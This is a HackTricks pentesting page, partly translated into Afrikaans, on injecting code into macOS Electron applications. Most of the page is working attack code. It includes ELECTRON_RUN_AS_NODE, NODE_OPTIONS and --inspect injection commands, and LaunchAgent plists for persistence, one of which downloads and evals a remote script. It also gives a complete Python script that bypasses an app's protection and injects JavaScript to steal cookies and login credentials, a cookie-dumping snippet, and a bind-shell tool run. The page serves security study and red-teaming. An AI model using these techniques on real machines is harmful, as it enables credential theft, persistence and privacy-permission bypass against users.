# macOS Electron Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basiese Inligting

As jy nie weet wat Electron is nie, kan jy [**hier baie inligting vind**](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/electron-desktop-apps/index.html#rce-xss--contextisolation). Maar vir nou hoef jy net te weet dat Electron **node** uitvoer.\
En node het sekere **parameters** en **env variables** wat gebruik kan word om dit **ander kode te laat uitvoer**, benewens die aangeduide lêer.

### Electron Fuses

Hierdie tegnieke sal volgende bespreek word, maar onlangs het Electron verskeie **security flags bygevoeg om dit te voorkom**. Dit is die [**Electron Fuses**](https://www.electronjs.org/docs/latest/tutorial/fuses), en hierdie is dié wat gebruik word om te voorkom dat **Electron apps** op macOS **arbitrary code laai**:<sup>[[1]](#references)</sup>

- **`RunAsNode`**: Indien gedeaktiveer, voorkom dit die gebruik van die env var **`ELECTRON_RUN_AS_NODE`** om code te injecteer.
- **`EnableNodeCliInspectArguments`**: Indien gedeaktiveer, sal params soos `--inspect` en `--inspect-brk` nie gerespekteer word nie. Dit voorkom hierdie manier om code te injecteer.
- **`EnableEmbeddedAsarIntegrityValidation`**: Indien geaktiveer, sal die gelaaide **`asar`** **file** deur macOS **gevalideer** word. Dit **voorkom** op hierdie manier **code injection** deur die inhoud van hierdie file te wysig.
- **`OnlyLoadAppFromAsar`**: Indien dit geaktiveer is, sal dit, in plaas daarvan om in die volgende volgorde te soek en te laai: **`app.asar`**, **`app`** en uiteindelik **`default_app.asar`**, slegs app.asar nagaan en gebruik. Dit verseker dus dat dit, wanneer dit **gekombineer** word met die **`embeddedAsarIntegrityValidation`** fuse, **onmoontlik** is om **nie-gevalideerde code te laai**.
- **`LoadBrowserProcessSpecificV8Snapshot`**: Indien geaktiveer, gebruik die browser process die file genaamd `browser_v8_context_snapshot.bin` vir sy V8 snapshot.

Nog ’n interessante fuse wat nie code injection sal voorkom nie, is:

- **EnableCookieEncryption**: Indien geaktiveer, word die cookie store op die skyf geënkripteer met OS-vlak kriptografiese sleutels.

### Kontroleer Electron Fuses

Jy kan hierdie flags vanuit ’n toepassing **kontroleer** met:
```bash
npx @electron/fuses read --app /Applications/Slack.app

Analyzing app: Slack.app
Fuse Version: v1
RunAsNode is Disabled
EnableCookieEncryption is Enabled
EnableNodeOptionsEnvironmentVariable is Disabled
EnableNodeCliInspectArguments is Disabled
EnableEmbeddedAsarIntegrityValidation is Enabled
OnlyLoadAppFromAsar is Enabled
LoadBrowserProcessSpecificV8Snapshot is Disabled
```
### Modifying Electron Fuses

Soos die [**dokumentasie aandui**](https://www.electronjs.org/docs/latest/tutorial/fuses#runasnode), word die konfigurasie van die **Electron Fuses** binne die **Electron binary** ingestel, wat êrens die string **`dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX`** bevat.<sup>[[1]](#references)</sup>

In macOS-toepassings is dit tipies in `application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework` geïnstalleer.
```bash
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
```
Jy kan hierdie lêer in [https://hexed.it/](https://hexed.it/) laai en vir die vorige string soek. Ná hierdie string kan jy in ASCII ’n getal "0" of "1" sien wat aandui of elke fuse gedeaktiveer of geaktiveer is. Wysig eenvoudig die hex-kode (`0x30` is `0` en `0x31` is `1`) om die fuse-waardes te **wysig**.

<figure><img src="../../../images/image (34).png" alt=""><figcaption></figcaption></figure>

Let daarop dat indien jy probeer om die **`Electron Framework`-binary** binne ’n toepassing te **oorskryf** nadat hierdie grepe gewysig is, die toepassing nie sal loop nie.

## RCE: voeg kode by Electron Applications

Daar kan **eksterne JS/HTML-lêers** wees wat ’n Electron App gebruik. ’n Aanvaller kan dus kode in hierdie lêers inject waarvan die handtekening nie nagegaan sal word nie, en arbitrêre kode in die konteks van die toepassing uitvoer.

> [!CAUTION]
> Daar is egter tans 2 beperkings:
>
> - Die **`kTCCServiceSystemPolicyAppBundles`**-permission is **nodig** om ’n App te wysig, dus is dit by verstek nie meer moontlik nie.
> - Die gekompileerde **`asap`**-lêer het gewoonlik die fuses **`embeddedAsarIntegrityValidation`** `and` **`onlyLoadAppFromAsar`** geaktiveer
>
> Dit maak hierdie aanvalspad meer ingewikkeld (of onmoontlik).

Let daarop dat dit moontlik is om die vereiste van **`kTCCServiceSystemPolicyAppBundles`** te omseil deur die toepassing na ’n ander directory (soos **`/tmp`**) te kopieer, die folder **`app.app/Contents`** na **`app.app/NotCon`** te hernoem, die **asar**-lêer met jou **kwaadwillige** kode te wysig, dit terug na **`app.app/Contents`** te hernoem en dit uit te voer.<sup>[[5]](#references)</sup>

Jy kan die kode uit die asar-lêer uitpak met:
```bash
npx asar extract app.asar app-decomp
```
En pak dit weer in nadat jy dit gewysig het met:
```bash
npx asar pack app-decomp app-new.asar
```
## RCE met ELECTRON_RUN_AS_NODE

Volgens [**die docs**](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node), as hierdie omgewingsveranderlike gestel is, sal dit die proses as ’n normale Node.js-proses begin.<sup>[[6]](#references)</sup>
```bash
# Run this
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
# Then from the nodeJS console execute:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
> [!CAUTION]
> As die fuse **`RunAsNode`** gedeaktiveer is, sal die env var **`ELECTRON_RUN_AS_NODE`** geïgnoreer word, en dit sal nie werk nie.

### Injection from the App Plist

Soos [**hier voorgestel**](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks/), kan jy hierdie env variable in ’n plist misbruik om persistence te handhaaf:<sup>[[2]](#references)</sup>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
</dict>
<key>Label</key>
<string>com.xpnsec.hideme</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>-e</string>
<string>const { spawn } = require("child_process"); spawn("osascript", ["-l","JavaScript","-e","eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding( $.NSData.dataWithContentsOfURL( $.NSURL.URLWithString('http://stagingserver/apfell.js')), $.NSUTF8StringEncoding)));"]);</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
## RCE met `NODE_OPTIONS`

Jy kan die payload in ’n ander lêer stoor en dit uitvoer:
```bash
# Content of /tmp/payload.js
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');

# Execute
NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
```
> [!CAUTION]
> If the fuse **`EnableNodeOptionsEnvironmentVariable`** is **disabled**, the app will **ignore** the env var **NODE_OPTIONS** when launched unless the env variable **`ELECTRON_RUN_AS_NODE`** is set, which will be also **ignored** if the fuse **`RunAsNode`** is disabled.
>
> If you don't set **`ELECTRON_RUN_AS_NODE`** , you will find the **fout**: `Most NODE_OPTIONs are not supported in packaged apps. See documentation for more details.`

### Injection vanaf die App Plist

You could abuse this env variable in a plist to maintain persistence adding these keys:
```xml
<dict>
<key>EnvironmentVariables</key>
<dict>
<key>ELECTRON_RUN_AS_NODE</key>
<string>true</string>
<key>NODE_OPTIONS</key>
<string>--require /tmp/payload.js</string>
</dict>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## RCE met inspecting

Volgens [**hierdie**](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f), indien jy 'n Electron-toepassing uitvoer met flags soos **`--inspect`**, **`--inspect-brk`** en **`--remote-debugging-port`**, sal 'n **debug-poort oop wees**, sodat jy daaraan kan koppel (byvoorbeeld vanaf Chrome in `chrome://inspect`) en jy sal **kode daarin kan inject** of selfs nuwe prosesse kan begin.<sup>[[7]](#references)</sup>\
Byvoorbeeld:
```bash
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229
# Connect to it using chrome://inspect and execute a calculator with:
require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator')
```
In [**this blogpost**](https://hackerone.com/reports/1274695) word hierdie debugging misbruik om ’n headless chrome **arbitrary files na arbitrary locations te laat download**.<sup>[[8]](#references)</sup>

> [!TIP]
> As ’n app sy eie manier het om te check of env variables of params soos `--inspect` gestel is, kan jy probeer om dit tydens runtime te **bypass** deur die arg `--inspect-brk` te gebruik, wat die execution **aan die begin van die app sal stop** en ’n bypass uitvoer (byvoorbeeld deur die args of die env variables van die huidige process te overwrite).

Die volgende was ’n exploit waar dit, deur die app met die param `--inspect-brk` te monitor en uit te voer, moontlik was om die custom protection wat dit gehad het te bypass (deur die params van die process te overwrite om `--inspect-brk` te verwyder) en daarna ’n JS payload te inject om cookies en credentials van die app te dump:
```python
import asyncio
import websockets
import json
import requests
import os
import psutil
from time import sleep

INSPECT_URL = None
CONT = 0
CONTEXT_ID = None
NAME = None
UNIQUE_ID = None

JS_PAYLOADS = """
var { webContents } = require('electron');
var fs = require('fs');

var wc = webContents.getAllWebContents()[0]


function writeToFile(filePath, content) {
const data = typeof content === 'string' ? content : JSON.stringify(content, null, 2);

fs.writeFile(filePath, data, (err) => {
if (err) {
console.error(`Error writing to file ${filePath}:`, err);
} else {
console.log(`File written successfully at ${filePath}`);
}
});
}

function get_cookies() {
intervalIdCookies = setInterval(() => {
console.log("Checking cookies...");
wc.session.cookies.get({})
.then((cookies) => {
tokenCookie = cookies.find(cookie => cookie.name === "token");
if (tokenCookie){
writeToFile("/tmp/cookies.txt", cookies);
clearInterval(intervalIdCookies);
wc.executeJavaScript(`alert("Cookies stolen and written to /tmp/cookies.txt")`);
}
})
}, 1000);
}

function get_creds() {
in_location = false;
intervalIdCreds = setInterval(() => {
if (wc.mainFrame.url.includes("https://www.victim.com/account/login")) {
in_location = true;
console.log("Injecting creds logger...");
wc.executeJavaScript(`
(function() {
email = document.getElementById('login_email_id');
password = document.getElementById('login_password_id');
if (password && email) {
return email.value+":"+password.value;
}
})();
`).then(result => {
writeToFile("/tmp/victim_credentials.txt", result);
})
}
else if (in_location) {
wc.executeJavaScript(`alert("Creds stolen and written to /tmp/victim_credentials.txt")`);
clearInterval(intervalIdCreds);
}
}, 10); // Check every 10ms
setTimeout(() => clearInterval(intervalId), 20000); // Stop after 20 seconds
}

get_cookies();
get_creds();
console.log("Payloads injected");
"""

async def get_debugger_url():
"""
Fetch the local inspector's WebSocket URL from the JSON endpoint.
Assumes there's exactly one debug target.
"""
global INSPECT_URL

url = "http://127.0.0.1:9229/json"
response = requests.get(url)
data = response.json()
if not data:
raise RuntimeError("No debug targets found on port 9229.")
# data[0] should contain an object with "webSocketDebuggerUrl"
ws_url = data[0].get("webSocketDebuggerUrl")
if not ws_url:
raise RuntimeError("webSocketDebuggerUrl not found in inspector data.")
INSPECT_URL = ws_url


async def monitor_victim():
print("Monitoring victim process...")
found = False
while not found:
sleep(1)  # Check every second
for process in psutil.process_iter(attrs=['pid', 'name']):
try:
# Check if the process name contains "victim"
if process.info['name'] and 'victim' in process.info['name']:
found = True
print(f"Found victim process (PID: {process.info['pid']}). Terminating...")
os.kill(process.info['pid'], 9)  # Force kill the process
except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
# Handle processes that might have terminated or are inaccessible
pass
os.system("open /Applications/victim.app --args --inspect-brk")

async def bypass_protections():
global CONTEXT_ID, NAME, UNIQUE_ID
print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]

sleep(1)

await send_cmd(ws, "Debugger.enable", {"maxScriptsCacheSize": 10000000})

await send_cmd(ws, "Profiler.enable")

await send_cmd(ws, "Debugger.setBlackboxPatterns", {"patterns": ["/node_modules/|/browser_components/"], "skipAnonnymous": False})

await send_cmd(ws, "Runtime.runIfWaitingForDebugger")

await send_cmd(ws, "Runtime.executionContextCreated", get_first=False, params={"context": {"id": CONTEXT_ID, "origin": "", "name": NAME, "uniqueId": UNIQUE_ID, "auxData": {"isDefault": True}}})

code_to_inject = """process['argv'] = ['/Applications/victim.app/Contents/MacOS/victim']"""
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression": code_to_inject, "uniqueContextId":UNIQUE_ID})
print("Injected code to bypass protections")


async def js_payloads():
global CONT, CONTEXT_ID, NAME, UNIQUE_ID

print(f"Connecting to {INSPECT_URL} ...")

async with websockets.connect(INSPECT_URL) as ws:
data = await send_cmd(ws, "Runtime.enable", get_first=True)
CONTEXT_ID = data["params"]["context"]["id"]
NAME = data["params"]["context"]["name"]
UNIQUE_ID = data["params"]["context"]["uniqueId"]
await send_cmd(ws, "Runtime.compileScript", get_first=False, params={"expression":JS_PAYLOADS,"sourceURL":"","persistScript":False,"executionContextId":1})
await send_cmd(ws, "Runtime.evaluate", get_first=False, params={"expression":JS_PAYLOADS,"objectGroup":"console","includeCommandLineAPI":True,"silent":False,"returnByValue":False,"generatePreview":True,"userGesture":False,"awaitPromise":False,"replMode":True,"allowUnsafeEvalBlockedByCSP":True,"uniqueContextId":UNIQUE_ID})



async def main():
await monitor_victim()
sleep(3)
await get_debugger_url()
await bypass_protections()

sleep(7)

await js_payloads()



async def send_cmd(ws, method, get_first=False, params={}):
"""
Send a command to the inspector and read until we get a response with matching "id".
"""
global CONT

CONT += 1

# Send the command
await ws.send(json.dumps({"id": CONT, "method": method, "params": params}))
sleep(0.4)

# Read messages until we get our command result
while True:
response = await ws.recv()
data = json.loads(response)

# Print for debugging
print(f"[{method} / {CONT}] ->", data)

if get_first:
return data

# If this message is a response to our command (by matching "id"), break
if data.get("id") == CONT:
return data

# Otherwise it's an event or unrelated message; keep reading

if __name__ == "__main__":
asyncio.run(main())
```
> [!CAUTION]
> Indien die fuse **`EnableNodeCliInspectArguments`** gedeaktiveer is, sal die app **node-parameters** (soos `--inspect`) ignoreer wanneer dit geloods word, tensy die omgewingsveranderlike **`ELECTRON_RUN_AS_NODE`** gestel is, wat ook geïgnoreer sal word indien die fuse **`RunAsNode`** gedeaktiveer is.
>
> Jy kan egter steeds die **electron-parameter `--remote-debugging-port=9229`** gebruik, maar die vorige payload sal nie werk om ander prosesse uit te voer nie.

Deur die parameter **`--remote-debugging-port=9222`** te gebruik, is dit moontlik om inligting uit die Electron App te steel, soos die **geskiedenis** (met GET-opdragte) of die **cookies** van die browser (aangesien hulle **gedekripteer** binne die browser is en daar ’n **json endpoint** is wat dit sal verskaf).

Jy kan leer hoe om dit te doen [**hier**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e) en [**hier**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f), en die outomatiese tool [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut) of ’n eenvoudige script soos die volgende gebruik:<sup>[[9]](#references)[[10]](#references)</sup>
```python
import websocket
ws = websocket.WebSocket()
ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
print(ws.recv()
```
### Injection vanuit die App Plist

Jy kan hierdie env variable in 'n plist misbruik om persistence te handhaaf deur hierdie keys by te voeg:
```xml
<dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Slack.app/Contents/MacOS/Slack</string>
<string>--inspect</string>
</array>
<key>Label</key>
<string>com.hacktricks.hideme</string>
<key>RunAtLoad</key>
<true/>
</dict>
```
## TCC Bypass abusing Ouer Weergawes

> [!TIP]
> Die TCC-daemon van macOS kontroleer nie die uitgevoerde weergawe van die toepassing nie. As jy dus **nie kode in 'n Electron-toepassing kan inject nie** met enige van die vorige tegnieke, kan jy 'n vorige weergawe van die APP aflaai en kode daarin inject, aangesien dit steeds die TCC-privileges sal ontvang (tensy Trust Cache dit voorkom).

## Run non JS Code

Die vorige tegnieke sal jou toelaat om **JS code binne die proses van die electron-toepassing** uit te voer. Onthou egter dat die **child processes onder dieselfde sandbox profile** as die parent application loop en hul TCC-permissions **inherit**.\
As jy dus byvoorbeeld entitlements wil abuse om toegang tot die kamera of mikrofoon te verkry, kan jy eenvoudig **'n ander binary vanuit die proses uitvoer**.

## Notable Electron macOS Vulnerabilities (2023-2024)

### CVE-2023-44402 – ASAR integrity bypass

Electron ≤22.3.23 en verskeie 23-27 pre-releases het 'n aanvaller met write access tot die `.app/Contents/Resources`-folder toegelaat om die `embeddedAsarIntegrityValidation` **en** `onlyLoadAppFromAsar` fuses te bypass. Die bug was 'n *file-type confusion* in die integrity checker wat toegelaat het dat 'n crafted **directory genaamd `app.asar`** gelaai word in plaas van die gevalideerde archive, sodat enige JavaScript binne daardie directory uitgevoer is wanneer die app gestart het. Selfs vendors wat die hardening guidance gevolg en albei fuses enabled het, was dus steeds kwesbaar op macOS.<sup>[[3]](#references)</sup>

Patched Electron-weergawes: **22.3.24**, **24.8.3**, **25.8.1**, **26.2.1** en **27.0.0-alpha.7**. Aanvallers wat 'n toepassing vind wat 'n ouer build gebruik, kan `Contents/Resources/app.asar` met hul eie directory oorskryf om code met die toepassing se TCC-entitlements uit te voer.<sup>[[3]](#references)</sup>

### 2024 “RunAsNode” / “enableNodeCliInspectArguments” CVE cluster

In Januarie 2024 het 'n reeks CVEs (CVE-2024-23738 tot en met CVE-2024-23743) beklemtoon dat baie Electron-apps steeds met die **RunAsNode**- en **EnableNodeCliInspectArguments**-fuses enabled verskeep word. 'n Local attacker kan die program dus herlaunch met die environment variable `ELECTRON_RUN_AS_NODE=1` of flags soos `--inspect-brk` om dit in 'n *generic* Node.js-process te verander en al die application se sandbox- en TCC-permissions te inherit.<sup>[[4]](#references)</sup>

Hoewel die Electron-span die “critical”-rating betwis het en daarop gewys het dat 'n aanvaller reeds local code–execution benodig, is die issue steeds waardevol tydens post-exploitation, omdat dit enige kwesbare Electron-bundle in 'n *living-off-the-land* binary verander wat byvoorbeeld Contacts, Photos of ander sensitiewe resources kan lees wat voorheen aan die desktop-app toegestaan is.<sup>[[4]](#references)</sup>

Defensive guidance van die Electron-maintainers:<sup>[[4]](#references)</sup>

* Disable die `RunAsNode`- en `EnableNodeCliInspectArguments`-fuses in production builds.
* Gebruik die nuwer **UtilityProcess** API as jou toepassing wettiglik 'n helper Node.js-process benodig, in plaas daarvan om daardie fuses weer te enable.

## Automatic Injection

- [**electroniz3r**](https://github.com/r3ggi/electroniz3r)

Die tool [**electroniz3r**](https://github.com/r3ggi/electroniz3r) kan maklik gebruik word om **kwesbare electron applications** wat geïnstalleer is, te **find** en code daarin te inject. Hierdie tool sal probeer om die **`--inspect`**-tegniek te gebruik:<sup>[[5]](#references)</sup>

Jy moet dit self compile en kan dit soos volg gebruik:
```bash
# Find electron apps
./electroniz3r list-apps

╔══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║    Bundle identifier                      │       Path                                               ║
╚──────────────────────────────────────────────────────────────────────────────────────────────────────╝
com.microsoft.VSCode                         /Applications/Visual Studio Code.app
org.whispersystems.signal-desktop            /Applications/Signal.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.neo4j.neo4j-desktop                      /Applications/Neo4j Desktop.app
com.electron.dockerdesktop                   /Applications/Docker.app/Contents/MacOS/Docker Desktop.app
org.openvpn.client.app                       /Applications/OpenVPN Connect/OpenVPN Connect.app
com.github.GitHubClient                      /Applications/GitHub Desktop.app
com.ledger.live                              /Applications/Ledger Live.app
com.postmanlabs.mac                          /Applications/Postman.app
com.tinyspeck.slackmacgap                    /Applications/Slack.app
com.hnc.Discord                              /Applications/Discord.app

# Check if an app has vulenrable fuses vulenrable
## It will check it by launching the app with the param "--inspect" and checking if the port opens
/electroniz3r verify "/Applications/Discord.app"

/Applications/Discord.app started the debug WebSocket server
The application is vulnerable!
You can now kill the app using `kill -9 57739`

# Get a shell inside discord
## For more precompiled-scripts check the code
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

/Applications/Discord.app started the debug WebSocket server
The webSocketDebuggerUrl is: ws://127.0.0.1:13337/8e0410f0-00e8-4e0e-92e4-58984daf37e5
Shell binding requested. Check `nc 127.0.0.1 12345`
```
- [https://github.com/boku7/Loki](https://github.com/boku7/Loki)

Loki is ontwerp om Electron-toepassings te backdoor deur die toepassings se JavaScript-lêers met die Loki Command & Control JavaScript-lêers te vervang.

## Verwysings

- [1] [Electron Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [2] [macOS-inspuiting via derdeparty-frameworks - TrustedSec](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [3] [ASAR-integriteit-omseiling via lêertipeverwarring (GHSA-7m48-wc93-9g85)](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [4] [Verklaring rakende 'runAsNode'-CVE's - Electron](https://www.electronjs.org/blog/statement-run-as-node-cves)
- [5] [DEF CON 31 - ELECTRONizing macOS Privacy - 'n Nuwe Wapen in Jou Red Teaming-wapenrusting - Wojciech Reguła](https://m.youtube.com/watch?v=VWQY5R2A6X8)
- [6] [Omgewingsveranderlikes | Electron](https://www.electronjs.org/docs/latest/api/environment-variables#electron_run_as_node)
- [7] [Waarom Electron-toepassings nie jou secrets vertroulik kan stoor nie: --inspect-opsie](https://medium.com/@metnew/why-electron-apps-cant-store-your-secrets-confidentially-inspect-option-a49950d6d51f)
- [8] [HackerOne-verslag #1274695 - Electron-debugging misbruik om arbitrêre lêers af te laai](https://hackerone.com/reports/1274695)
- [9] [Hands in the Cookie Jar: Koekies dump met Chromium se Remote Debugger Port - SpecterOps](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)
- [10] [Foutopsporing van koekie-dumping-foute met Chromium se Remote Debugger - slyd0g](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)

{{#include ../../../banners/hacktricks-training.md}}
